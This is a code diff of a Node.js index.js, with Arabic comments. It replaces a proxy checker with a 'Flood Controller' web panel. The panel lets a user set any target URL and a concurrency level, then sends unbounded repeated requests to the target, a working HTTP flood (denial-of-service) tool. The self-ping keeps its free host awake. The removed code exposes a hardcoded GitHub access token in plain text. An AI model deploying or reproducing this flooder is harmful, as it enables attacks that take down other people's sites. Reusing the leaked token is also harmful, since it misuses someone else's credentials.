@@ -1,120 +1,112 @@
 // index.js
-const fs = require('fs');
-const axios = require('axios');
-const { HttpsProxyAgent } = require('https-proxy-agent');
-const { SocksProxyAgent } = require('socks-proxy-agent');
-const express = require('express');
+const express = require("express");
+const axios = require("axios");
+const http = require("http");
+
 const app = express();
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
 
-const GITHUB_USER = 'noon1231';
-const GITHUB_REPO = 'NOON';
-const FILE_PATH = 'p.txt';
-const GITHUB_TOKEN = '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';   
-const RAW_URL = `https://raw.githubusercontent.com/NOON1231/NOON/main/p.txt`;
-const KEEP_ALIVE_URL = 'https://noon-9v11.onrender.com/';
-const BATCH_SIZE = 200;
-const TIMEOUT = 4000;
+// الإعدادات
+let targetUrl = "https://get.example.com";
+let concurrentRequests = 10; // عدد الطلبات في نفس اللحظة
+let running = false;
 
-let proxyList = [];
-let goodProxies = [];
-let checking = false;
-let lastUpdate = new Date();
+// رابط الـ Render نفسه (self-ping)
+const selfUrl = "https://noon-9v11.onrender.com/";
 
-// تحميل البروكسيات
-async function loadProxies() {
+// عميل Keep-Alive
+const keepAliveAgent = new http.Agent({ keepAlive: true });
+
+// وظيفة إرسال طلب واحد
+async function sendRequest(i) {
   try {
-    const res = await axios.get(RAW_URL);
-    proxyList = res.data.split(/\r?\n/).filter(line => line.trim());
-    console.log(`Loaded ${proxyList.length} proxies`);
+    await axios.get(targetUrl, { httpAgent: keepAliveAgent });
+    console.log(`✅ Request ${i} sent`);
   } catch (err) {
-    console.error('Error loading proxies:', err.message);
+    console.log(`❌ Request ${i} failed`);
   }
 }
 
-// اختبار البروكسي
-async function testProxy(proxy) {
-  try {
-    let agent;
-    if (proxy.startsWith('socks')) {
-      agent = new SocksProxyAgent(proxy);
-    } else {
-      agent = new HttpsProxyAgent(proxy);
+// لوب الإرسال
+async function runFlood() {
+  let counter = 0;
+  while (running) {
+    const promises = [];
+    for (let i = 0; i < concurrentRequests; i++) {
+      counter++;
+      promises.push(sendRequest(counter));
     }
-    await axios.get('https://www.google.com', { httpsAgent: agent, timeout: TIMEOUT });
-    return true;
-  } catch {
-    return false;
+    await Promise.all(promises);
   }
 }
 
-// حفظ البروكسيات الجيدة على GitHub
-async function saveGoodProxies() {
-  try {
-    const content = goodProxies.join('\n');
-    const url = `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${FILE_PATH}`;
-    
-    const shaRes = await axios.get(url, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
-    const sha = shaRes.data.sha;
-
-    await axios.put(url, {
-      message: 'Update working proxies',
-      content: Buffer.from(content).toString('base64'),
-      sha
-    }, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
-
-    console.log(`Saved ${goodProxies.length} good proxies to GitHub`);
-  } catch (err) {
-    console.error('Error saving proxies:', err.message);
-  }
-}
-
-// فحص جميع البروكسيات
-async function checkAllProxies() {
-  if (checking) return;
-  checking = true;
-  goodProxies = [];
-  let index = 0;
-
-  try {
-    while (index < proxyList.length) {
-      const batch = proxyList.slice(index, index + BATCH_SIZE);
-      const results = await Promise.all(batch.map(p => testProxy(p)));
-      results.forEach((res, i) => {
-        if (res) goodProxies.push(batch[i]);
-      });
-      index += BATCH_SIZE;
-      lastUpdate = new Date();
-      console.log(`Checked ${Math.min(index, proxyList.length)} / ${proxyList.length} proxies, good: ${goodProxies.length}`);
-    }
-
-    await saveGoodProxies();
-  } catch (err) {
-    console.error('Error during proxy check:', err.message);
-  } finally {
-    checking = false;
-  }
-}
-
-// Keep-alive
+// Self Ping كل 5 دقائق
 setInterval(async () => {
   try {
-    await axios.get(KEEP_ALIVE_URL);
-  } catch {}
-}, 5 * 60 * 1000);
+    await axios.get(selfUrl, { httpAgent: keepAliveAgent });
+    console.log("🔄 Self-ping sent to keep Render awake");
+  } catch (err) {
+    console.log("⚠️ Self-ping failed");
+  }
+}, 5 * 60 * 1000); // 5 دقائق
 
-// واجهة الويب
-app.get('/', (req, res) => {
+// صفحة التحكم
+app.get("/", (req, res) => {
   res.send(`
-    <h2>Proxy Checker NOON</h2>
-    <p>Last update: ${lastUpdate}</p>
-    <p>Total proxies: ${proxyList.length}</p>
-    <p>Good proxies: ${goodProxies.length}</p>
-    <p>Status: ${checking ? 'Checking...' : 'Idle'}</p>
+    <html>
+    <head>
+      <title>Flood Control</title>
+      <style>
+        body { background: black; color: white; font-family: sans-serif; text-align:center; }
+        input, button { padding: 10px; margin: 5px; font-size: 16px; }
+      </style>
+    </head>
+    <body>
+      <h1>Flood Controller</h1>
+      <form method="POST" action="/config">
+        <label>Target URL: </label>
+        <input name="url" value="${targetUrl}" size="40"/><br>
+        <label>Requests at once: </label>
+        <input name="concurrent" value="${concurrentRequests}" type="number"/><br>
+        <button type="submit">Update Config</button>
+      </form>
+      <br>
+      <form method="POST" action="/start">
+        <button type="submit">🚀 Start</button>
+      </form>
+      <form method="POST" action="/stop">
+        <button type="submit">🛑 Stop</button>
+      </form>
+      <p>Status: ${running ? "🟢 Running" : "🔴 Stopped"}</p>
+    </body>
+    </html>
   `);
 });
 
-app.listen(10000, async () => {
-  console.log('Server running on port 10000');
-  await loadProxies();
-  checkAllProxies();
+// تحديث الإعدادات
+app.post("/config", (req, res) => {
+  if (req.body.url) targetUrl = req.body.url;
+  if (req.body.concurrent) concurrentRequests = parseInt(req.body.concurrent);
+  res.redirect("/");
+});
+
+// بدء الإرسال
+app.post("/start", (req, res) => {
+  if (!running) {
+    running = true;
+    runFlood();
+  }
+  res.redirect("/");
+});
+
+// إيقاف الإرسال
+app.post("/stop", (req, res) => {
+  running = false;
+  res.redirect("/");
+});
+
+const port = process.env.PORT || 10000;
+app.listen(port, () => {
+  console.log(`Server running on port ${port}`);
 });
